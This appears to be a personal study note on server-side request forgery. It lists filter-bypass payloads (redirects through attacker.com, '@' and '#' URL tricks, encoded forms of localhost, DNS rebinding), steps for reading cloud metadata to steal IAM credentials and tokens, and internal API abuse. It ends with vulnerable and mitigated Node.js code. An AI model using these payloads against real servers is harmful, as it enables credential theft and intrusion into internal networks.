# explanation 
**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker tricks a server into making unintended or malicious requests to internal or external resources on behalf of the attacker.

# Webhooks 
are custom HTTP callback endpoints used as a notification system for certain application events. When an event such as new user sign-up or application error occurs, the originating site will make an HTTP request to the webhook URL. These HTTP requests help the company collect information about the website’s performance and visitors. It also helps organizations keep data in sync across multiple web applications.[example of exploiting webhook](https://hackerone.com/reports/2301565)  [another report](https://hackerone.com/reports/508459)   the explanation in the [[scenarios]]

# Potential SSRF Endpoints
- Add a new webhook:
	 `POST /webhook Host: public.example.com
	 `(POST request body) url=https://www.attacker.`

- File upload via URL:
	 `POST /upload_profile_from_url Host: public.example.com
	 `(POST request body) user_id=1234&url=https://www.attacker.com/profile.jpeg

- Proxy service:
	 `https://public.example.com/proxy?url=https://google.com





# Bypassing SSRF FILTERs 
just check [payload of all things ](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
## Bypass Allowlists 

### Allowlists based on the website we are talking  
are generally the hardest to bypass, because they are, by default, stricter than blocklists. But getting around them is still possible if you can find an<span style="color:rgb(146, 208, 80)"> open redirect vulnerability </span>within the allowlisted domains. If you find one, you can request an allowlisted URL that redirects to an internal URL. For example, even if the site allows only profile pictures uploaded from one of its subdomains, you can induce an SSRF through an open redirect.
In the following request, we utilize an open redirect on pics.example.com to redirect the request to 127.0.0.1, the IP address for the localhost. This way, even though the url parameter passes the allowlist, it still redirects to a restricted internal address:

`POST /upload_profile_from_url Host: public.example.com`
`(POST request body) user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1`
### allow list based on regex  
`POST /upload_profile_from_url Host: public.example.com
(POST request body) user_id=1234&url=<span style="color:rgb(146, 208, 80)">https://pics.example.com@127.0.0.1</span>`
you can use <span style="color:rgb(146, 208, 80)">@</span> to tell the server what's after the @ <span style="color:rgb(146, 208, 80)">is the domain I'm talking </span> 

**or u can use** 

`(POST request body) user_id=1234&url=https://127.0.0.1#/pics.example.com
<span style="color:rgb(112, 48, 160)">the hash here commenting all the content after it </span>


## bypassing blacklist 
### Fooling It with Redirects
`https://public.example.com/proxy?url=https://attacker.com/ssrf`

Then, on your server at https://attacker.com/ssrf, you can host a file with the following content:
`<?php header("location: http://127.0.0.1"); ?>`

### Using IPv6 Addresses
instead of typing the ipv4 you can write it in ipv6  like this `64:ff9b::255.255.255.255`

### Tricking the Server with DNS
**DNS Records**: A records map to IPv4, AAAA records map to IPv6.
**Modify DNS Records**: Point your domain’s A/AAAA records to internal IPs of the target network.
**Practical Use**: Set your domain to resolve to 127.0.0.1 (localhost), then trick the target server into requesting data from its own internal network.
**Check DNS Records**: Use `nslookup DOMAIN` or `nslookup DOMAIN -type=AAAA`.
**Configuring DNS**: Adjust DNS records via your domain registrar, e.g., Namecheap, under Advanced DNS settings.   
`https://public.example.com/proxy?url=https://attacker.com`
Now when the target server requests your domain, it will think your domain is located at <span style="color:rgb(255, 0, 0)">127.0.0.1</span> and request data from that address
### Switching Out the Encoding 
Possible encoding methods include hex encoding, octal encoding, dword encoding, URL encoding, and mixed encoding. If the URL parser of the target server does not process these encoding methods appropriately, 
<span style="color:rgb(255, 0, 0)">0x7f.0x0.0x0.0x1</span>  equivalent for <span style="color:rgb(255, 0, 0)">127.0.0.1</span>
`https://0177.0.0.01`
`https://2130706433`
`https://%6c%6f%63%61%6c%68%6f%73%74`   all are ways of encoding 


# Escalating the Attack
## if the web server is vulnerable to shell shock attack you might escalate the targeted server to be an internal server  using ssrf 
[helpful link](https://github.com/anmolksachan/Blind-SSRF-with-Shellshock-exploitation)

## discovering the host 
- **Host Discovery**:
    
    - By submitting different internal IP addresses (e.g., `10.0.0.1` and `10.0.0.2`), you can deduce whether a host exists based on the response.
    - Example: An error response with "Apache" indicates a valid host, while "Connection Failed" indicates no host at that address.
- **Port Scanning**:
    
    - You can use SSRF to scan for open ports by changing the port number in requests.
    - Server behavior changes between open ports (e.g., port 80 returns Apache details) and closed ports (e.g., port 11 returns "Connection Failed").
    - Identifying open ports like 22 (SSH), 80 (HTTP), or 443 (HTTPS) helps reveal services running on the machine.
- **Further Attacks**:
    
    - Use the information, such as software versions (e.g., Apache/Ubuntu), to craft more targeted attacks based on known vulnerabilities in those systems.

## Cloud Instance Metadata API Vulnerabilities

Cloud services like **Amazon EC2** and **Google Cloud** expose instance metadata APIs that reveal sensitive information. Attackers can use SSRF to query these APIs, leading to information leaks or remote code execution (RCE).

### Amazon EC2 Metadata API:

- Endpoint: `http://169.254.169.254/latest/meta-data/`
- Useful data:
    - **Local Hostname**: `/latest/meta-data/local-hostname/`
    - **IAM Role Credentials**: `/latest/meta-data/iam/security-credentials/ROLE_NAME`
    - **Instance Private IP**: `/latest/dynamic/instance-identity/document/`
    - **User Data**: `/latest/user-data/`
- Full API documentation: [AWS EC2 Instance Metadata API](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).

### Google Cloud Metadata API:

- Normal Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
    - Requires headers:
        
        `Metadata-Flavor: Google`
        `X-Google-Metadata-Request: True`
        
- Bypass using deprecated v1beta1: `http://metadata.google.internal/computeMetadata/v1beta1/`
    - Example critical endpoints:
        - **Access Token**: `/instance/service-accounts/default/token`
        - **SSH Keys**: `/project/attributes/ssh-keys`
- Full API documentation: Google Cloud Metadata API.

### Other Platforms:

- **DigitalOcean**: `http://169.254.169.254/metadata/v1/` (retrieves instance info like hostname, user data).
- **Kubernetes**: Access endpoints like `https://kubernetes.default` for cluster information.

You can exploit these APIs in SSRF attacks to retrieve sensitive data and potentially escalate privileges. 


#  Network and Port Scanning Using Blind SSRF

  

## HTTP Status Codes

- By comparing the status codes returned (e.g., **200** vs. **500**), you can infer which network addresses are valid or invalid.

  - **200**: Valid host or open port.

  - **500**: Invalid host or closed port.

## Response Time Analysis

- Response times can reveal network structure.

  - **Longer times**: Possible unrouted addresses or firewall presence.

  - **Shorter times**: May indicate dropped requests or immediate rejections.

  

## Internal API Calls via SSRF

- **Trigger Internal API Calls**: You can exploit SSRF to send requests to internal APIs (e.g., deleting users or accessing internal services).

  - Example: `https://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1`

  

## Using Leaked Credentials

- **Access Network Resources**: Leaked credentials (e.g., AWS keys) allow access to internal data like **S3 buckets** or restricted resources.

## Escalation to Remote Code Execution (RCE)

- Use SSRF to gain further control:

  - Upload shells or execute scripts if admin privileges or features are accessible.

  

## Extracting Information from Outbound Requests

- Target machines might expose **internal IPs**, **headers**, or **software versions** via outbound requests. Host a server and analyze incoming requests for leaks.

  

## Bypassing Access Controls

- **Proxy through trusted machines** to access sensitive internal services.

  - Example: `https://public.example.com/proxy?url=https://admin.example.com`

  

## Actionable Steps

1. Compare status codes and response times.

2. Perform internal API calls and attempt to exploit sensitive functionalities.

3. Use leaked credentials for privilege escalation.

4. Aim for further attacks like RCE or bypassing access controls.



# ideas 
- [x] Spot Features Prone to SSRFs  like mentioned above 
- [x] check if the website send request to any ULR 
- [x] check if he uses referrer header for analytics by inserting you collaborator URL 
- [x] http://127.1/admin instead of localhost and all the bypasses i mentioned earlier
- [x] try to fiend any redirection page and try to exploit ssrf using open redirect   

# SSRF Vulnerabilities and Mitigation Techniques

  

## Vulnerable Code Example (SSRF)

  

```js

const axios = require('axios');

  

app.get('/fetch', async (req, res) => {

    const { url } = req.query;

    try {

        const response = await axios.get(url);

        res.send(response.data);

    } catch (error) {

        res.status(500).send('Error fetching URL');

    }

});

```

  

In this example, the application allows users to pass arbitrary URLs through the `url` parameter, making it vulnerable to SSRF attacks.

  

---

  

## Mitigated Code Example

  

### 1. **Whitelist Specific Domains**

  

Use a whitelist of allowed domains and ensure that users can only request resources from these trusted domains.

  

```js

const axios = require('axios');

  

const allowedDomains = ['https://trusted.com', 'https://example.com'];

  

app.get('/fetch', async (req, res) => {

    const { url } = req.query;

  

    // Check if the URL belongs to an allowed domain

    const parsedUrl = new URL(url);

    if (!allowedDomains.includes(parsedUrl.origin)) {

        return res.status(403).send('Domain not allowed');

    }

  

    try {

        const response = await axios.get(url);

        res.send(response.data);

    } catch (error) {

        res.status(500).send('Error fetching URL');

    }

});

```

  

### 2. **Validate and Sanitize Input**

  

Strictly validate the URL format and restrict the scheme to `http` or `https`. Reject other schemes like `file://`, `ftp://`, `gopher://`, etc.

  

```js

const axios = require('axios');

const url = require('url');

  

function isValidUrl(userUrl) {

    const parsedUrl = new URL(userUrl);

    return ['http:', 'https:'].includes(parsedUrl.protocol);

}

  

app.get('/fetch', async (req, res) => {

    const { url } = req.query;

  

    // Check if the URL is valid

    if (!isValidUrl(url)) {

        return res.status(400).send('Invalid URL');

    }

  

    try {

        const response = await axios.get(url);

        res.send(response.data);

    } catch (error) {

        res.status(500).send('Error fetching URL');

    }

});

```

  

### 3. **Limit Request Scope**

  

Prevent access to private or internal IP ranges (e.g., 127.0.0.1, 169.254.169.254, 10.x.x.x, etc.). Block requests to internal services or cloud metadata endpoints.

  

```js

const ipRangeCheck = require('ip-range-check');

  

function isPrivateIp(url) {

    const ipRanges = [

        '127.0.0.0/8',     // Loopback

        '10.0.0.0/8',       // Private Network

        '172.16.0.0/12',    // Private Network

        '192.168.0.0/16',   // Private Network

        '169.254.0.0/16',   // Link-local

        '::1/128'           // IPv6 Loopback

    ];

  

    const parsedUrl = new URL(url);

    return ipRangeCheck(parsedUrl.hostname, ipRanges);

}

```

  

### 4. **Use Network Security Controls**

  

Configure firewalls or network security groups to block outbound connections to internal networks. Implement "outbound traffic filtering" to prevent the server from making arbitrary requests to sensitive services. Use a web proxy to enforce network security policies.

  

### 5. **Reduce HTTP Client Capabilities**

  

Disable redirects (`maxRedirects: 0`), which can be abused to point to malicious URLs. Restrict supported HTTP methods (only `GET`, block `POST`, `PUT`, etc.).

  

```js

const axios = require('axios');

  

const config = {

    maxRedirects: 0,  // Disable redirects

    timeout: 5000     // Add a timeout to avoid hanging requests

};

  

// Use the config when making requests

const response = await axios.get(userUrl, config);

```

  

### 6. **Authenticate and Sanitize Requests**

  

Sanitize inputs to prevent the injection of malicious or malformed URLs. Ensure that URLs do not contain harmful input, like using encoded characters to bypass filters.

  

### 7. **Use Timeouts and Rate Limiting**

  

Apply timeouts on external requests to prevent the server from being blocked by slow or malicious responses. Use rate-limiting for the endpoint to prevent abuse by attackers sending multiple requests in a short period.

  

---

  

## **Summary of SSRF Mitigation Strategies**

  

1. **Whitelist allowed domains/IPs**.

2. **Strict URL validation**: Validate the URL format and restrict protocols.

3. **Limit requests to external networks**: Block access to internal/private IP ranges and services.

4. **Disable unnecessary features**: Disable redirects and limit HTTP methods.

5. **Use network firewalls/proxies** to control external access.

6. **Timeout and rate-limiting**: Prevent denial-of-service attacks via malicious requests.

7. **Use secure libraries**: Ensure that libraries or HTTP clients used are updated and secure.

  

By implementing these mitigations, you can significantly reduce the risk of SSRF attacks in your application.